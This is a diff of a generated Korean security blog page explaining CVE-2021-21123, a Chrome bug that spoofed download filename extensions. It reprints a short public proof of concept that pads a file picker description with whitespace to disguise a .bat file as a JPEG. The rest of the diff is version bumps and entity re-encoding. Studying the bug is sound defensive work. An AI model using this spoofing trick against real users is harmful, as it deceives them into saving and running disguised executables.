@@ -61,7 +61,7 @@
   <script src="/js/utils.js"></script>
   <script src="/js/color-schema.js"></script>
 
-<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/rss2.xml" title="hackyboiz" type="application/rss+xml">
+<meta name="generator" content="Hexo 5.1.1"><link rel="alternate" href="/rss2.xml" title="hackyboiz" type="application/rss+xml">
 </head>
 
 <body>
@@ -189,7 +189,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      205 자
+      349 자
     </span>
   
 
@@ -199,7 +199,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      4
+      6
        분
     </span>
   
@@ -243,32 +243,32 @@
               <h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a><strong>URL</strong></h2><p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://bugs.chromium.org/p/chromium/issues/detail?id=1137247">Issue 1137247: Security: Spoofing download filename extension in 86 chrome</a></p>
 <h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Google Chrome &lt; 88.0.4324.96</p>
 <h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><blockquote>
-<p>CVE-2021-21123:  88.0.4324.96 이전 Google Chrome의 File System API에서 불충분한 데이터 유효성 검사를 통해 공격자는 조작된 HTML 페이지를 통해 파일 시스템 제한을 무시할 수 있습니다. </p>
+<p>CVE-2021-21123:  88.0.4324.96 &#xC774;&#xC804; Google Chrome&#xC758; File System API&#xC5D0;&#xC11C; &#xBD88;&#xCDA9;&#xBD84;&#xD55C; &#xB370;&#xC774;&#xD130; &#xC720;&#xD6A8;&#xC131; &#xAC80;&#xC0AC;&#xB97C; &#xD1B5;&#xD574; &#xACF5;&#xACA9;&#xC790;&#xB294; &#xC870;&#xC791;&#xB41C; HTML &#xD398;&#xC774;&#xC9C0;&#xB97C; &#xD1B5;&#xD574; &#xD30C;&#xC77C; &#xC2DC;&#xC2A4;&#xD15C; &#xC81C;&#xD55C;&#xC744; &#xBB34;&#xC2DC;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p>
 </blockquote>
 <pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>
-<span class="javascript">        <span class="hljs-keyword">const</span> butSaveNewFile = <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&#x27;addNewFile&#x27;</span>)</span>
-<span class="javascript">        butSaveNewFile.addEventListener(<span class="hljs-string">&#x27;click&#x27;</span>, <span class="hljs-keyword">async</span> () =&gt; &#123;</span>
-<span class="javascript">            <span class="hljs-keyword">const</span> options = &#123;</span>
+<span class="javascript">        <span class="hljs-keyword">const</span> butSaveNewFile = <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&apos;addNewFile&apos;</span>)</span>
+<span class="javascript">        butSaveNewFile.addEventListener(<span class="hljs-string">&apos;click&apos;</span>, <span class="hljs-keyword">async</span> () =&gt; {</span>
+<span class="javascript">            <span class="hljs-keyword">const</span> options = {</span>
                 types: [
-                    &#123;
+                    {
                         description:
-<span class="javascript">                            <span class="hljs-string">&#x27;JPEG Image (*.jpeg)                                                                                                                                                                                                                                                         &#x27;</span>,</span>
-                        accept: &#123;
-<span class="javascript">                            <span class="hljs-string">&#x27;text/plain&#x27;</span>: [<span class="hljs-string">&#x27;.bat&#x27;</span>]</span>
-                        &#125;,
-<span class="javascript">                        content: <span class="hljs-string">&#x27;C:\\Windows\\system32\\calc.exe&#x27;</span></span>
-                    &#125;
+<span class="javascript">                            <span class="hljs-string">&apos;JPEG Image (*.jpeg)                                                                                                                                                                                                                                                         &apos;</span>,</span>
+                        accept: {
+<span class="javascript">                            <span class="hljs-string">&apos;text/plain&apos;</span>: [<span class="hljs-string">&apos;.bat&apos;</span>]</span>
+                        },
+<span class="javascript">                        content: <span class="hljs-string">&apos;C:\\Windows\\system32\\calc.exe&apos;</span></span>
+                    }
                 ]
-            &#125;
+            }
 <span class="javascript">            <span class="hljs-keyword">const</span> handle = <span class="hljs-keyword">await</span> <span class="hljs-built_in">window</span>.showSaveFilePicker(options)</span>
 <span class="javascript">            <span class="hljs-keyword">const</span> writable = <span class="hljs-keyword">await</span> handle.createWritable()</span>
-<span class="javascript">            <span class="hljs-keyword">await</span> writable.write(<span class="hljs-string">&#x27;C:\\Windows\\system32\\calc.exe&#x27;</span>)</span>
+<span class="javascript">            <span class="hljs-keyword">await</span> writable.write(<span class="hljs-string">&apos;C:\\Windows\\system32\\calc.exe&apos;</span>)</span>
 <span class="javascript">            <span class="hljs-keyword">await</span> writable.close()</span>
-<span class="javascript">            alert(<span class="hljs-string">&#x27;File saved&#x27;</span>)</span>
-        &#125;)
+<span class="javascript">            alert(<span class="hljs-string">&apos;File saved&apos;</span>)</span>
+        })
     <span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre>
 
-<p>위는 공개된 HTML PoC의 일부입니다. 변수  <code>description</code>의 값은 Google Chrome이 호출하는 “Save as(다른 이름으로 저장)” 창에서 다운로드될 파일의 확장자를 사용자에게 보여주는 용도로 사용됩니다. <code>description</code>에 연속적인 공백 문자 혹은 <code>*</code>이 포함되지 못하도록 막는 필터링의 부재로 인해 다운로드될 파일의 실제 확장자를 숨기거나 속일 수 있습니다(Spoofing download filename). 해당 취약점을 악용해 원격으로 타겟 시스템에 악성 코드를 설치 및 실행할 수 있기 때문에 User Interaction이 필요함에도 불구하고 높은 심각도의 취약점으로 분류됐습니다.</p>
+<p>&#xC704;&#xB294; &#xACF5;&#xAC1C;&#xB41C; HTML PoC&#xC758; &#xC77C;&#xBD80;&#xC785;&#xB2C8;&#xB2E4;. &#xBCC0;&#xC218;  <code>description</code>&#xC758; &#xAC12;&#xC740; Google Chrome&#xC774; &#xD638;&#xCD9C;&#xD558;&#xB294; &#x201C;Save as(&#xB2E4;&#xB978; &#xC774;&#xB984;&#xC73C;&#xB85C; &#xC800;&#xC7A5;)&#x201D; &#xCC3D;&#xC5D0;&#xC11C; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC;&#xB420; &#xD30C;&#xC77C;&#xC758; &#xD655;&#xC7A5;&#xC790;&#xB97C; &#xC0AC;&#xC6A9;&#xC790;&#xC5D0;&#xAC8C; &#xBCF4;&#xC5EC;&#xC8FC;&#xB294; &#xC6A9;&#xB3C4;&#xB85C; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;. <code>description</code>&#xC5D0; &#xC5F0;&#xC18D;&#xC801;&#xC778; &#xACF5;&#xBC31; &#xBB38;&#xC790; &#xD639;&#xC740; <code>*</code>&#xC774; &#xD3EC;&#xD568;&#xB418;&#xC9C0; &#xBABB;&#xD558;&#xB3C4;&#xB85D; &#xB9C9;&#xB294; &#xD544;&#xD130;&#xB9C1;&#xC758; &#xBD80;&#xC7AC;&#xB85C; &#xC778;&#xD574; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC;&#xB420; &#xD30C;&#xC77C;&#xC758; &#xC2E4;&#xC81C; &#xD655;&#xC7A5;&#xC790;&#xB97C; &#xC228;&#xAE30;&#xAC70;&#xB098; &#xC18D;&#xC77C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;(Spoofing download filename). &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC545;&#xC6A9;&#xD574; &#xC6D0;&#xACA9;&#xC73C;&#xB85C; &#xD0C0;&#xAC9F; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0; &#xC545;&#xC131; &#xCF54;&#xB4DC;&#xB97C; &#xC124;&#xCE58; &#xBC0F; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; User Interaction&#xC774; &#xD544;&#xC694;&#xD568;&#xC5D0;&#xB3C4; &#xBD88;&#xAD6C;&#xD558;&#xACE0; &#xB192;&#xC740; &#xC2EC;&#xAC01;&#xB3C4;&#xC758; &#xCDE8;&#xC57D;&#xC810;&#xC73C;&#xB85C; &#xBD84;&#xB958;&#xB410;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
 
             </div>
             <hr>
@@ -567,6 +567,45 @@
 
 
 
+
+  
+
+  
+    <!-- MathJax -->
+    <script>
+      MathJax = {
+        tex: {
+          inlineMath: [['$', '$'], ['\\(', '\\)']]
+        },
+        options: {
+          renderActions: {
+            findScript: [10, doc => {
+              document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+                const display = !!node.type.match(/; *mode=display/);
+                const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+                const text = document.createTextNode('');
+                node.parentNode.replaceChild(text, node);
+                math.start = { node: text, delim: '', n: 0 };
+                math.end = { node: text, delim: '', n: 0 };
+                doc.math.push(math);
+              });
+            }, '', false],
+            insertedScript: [200, () => {
+              document.querySelectorAll('mjx-container').forEach(node => {
+                let target = node.parentNode;
+                if (target.nodeName.toLowerCase() === 'li') {
+                  target.parentNode.classList.add('has-jax');
+                }
+              });
+            }, '', false]
+          }
+        }
+      };
+    </script>
+
+    <script async src="https://cdn.staticfile.org/mathjax/3.0.5/es5/tex-svg.js"></script>
+
+  
 
 
 
